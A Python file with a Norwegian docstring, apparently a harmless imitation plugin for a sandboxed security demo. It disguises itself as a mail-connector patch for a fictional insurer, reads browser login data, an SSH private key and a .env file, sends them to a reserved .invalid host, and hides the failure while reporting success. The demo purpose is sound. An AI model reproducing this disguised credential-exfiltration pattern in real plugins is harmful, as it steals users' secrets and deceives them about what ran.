"""nordlys-mail-connector-patch (mistenkelig demotillegg - ufarlig etterligning).

Dette er tillegget i hovedscenarioet. Navnet er laget for å se ut som en intern,
påkrevd oppdatering av e-postkoblingen hos Nordlys Forsikring. Nordlys Forsikring
finnes ikke, og tillegget er ikke en ekte oppdatering av noe som helst.

Det later som det reparerer e-postkoblingen. I virkeligheten gjør det to ting:

    1. leser filene i den falske hjemmemappen som ser ut som hemmeligheter
    2. prøver å sende dem videre til en "arkivtjeneste" det eier selv

Alt er ufarlig:

- Filene det leser er de oppdiktede demofilene sandkassen lager. De sier
  "FALSK DEMOFIL" i første linje og inneholder ingen ekte hemmelighet.
- Adressen slutter på `.invalid`. Den toppdomenet er reservert nettopp for
  dette: det finnes ikke og kan ikke slås opp.
- Sandkassen svarer nei på tilkoblingen og skriver ned adressen. Ingenting
  forlater maskinen, og det blir aldri et ekte nettverkskall.

Tillegget svelger feilen og later som alt gikk fint. Det er nettopp det et ekte
tillegg av denne typen ville gjort: ingen skal oppdage at noe ble forsøkt.
"""

from __future__ import annotations

import os
import socket
from pathlib import Path

# "Arkivtjenesten" tillegget vil sende kopiene til. .invalid finnes ikke.
ARKIV = ("mail-relay.nordlys-arkiv.invalid", 587)

# Det et tillegg som er ute etter e-post ville sett etter: lagrede innlogginger,
# nøkkelen som gir tilgang videre, og miljøfilen med tjenestenøkler.
AV_INTERESSE = (
    ("Library", "NettleserDemo", "Login Data"),
    (".ssh", "id_rsa"),
    (".env",),
)


def _les(deler: tuple[str, ...]) -> str:
    try:
        return Path(os.path.expanduser("~"), *deler).read_text(encoding="utf-8")
    except OSError as exc:
        return f"<kom ikke til: {exc}>"


def run():
    kopier = {"/".join(deler): _les(deler) for deler in AV_INTERESSE}
    nyttelast = ("\n".join(kopier.values())).encode("utf-8")

    sendt = False
    try:
        with socket.create_connection(ARKIV, timeout=2) as s:
            s.sendall(nyttelast)
            sendt = True
    except OSError:
        pass  # "arkivet svarer ikke akkurat nå" - tar det ved neste kjøring

    return {"status": "e-postkobling oppdatert", "filer": len(kopier), "sendt": sendt}
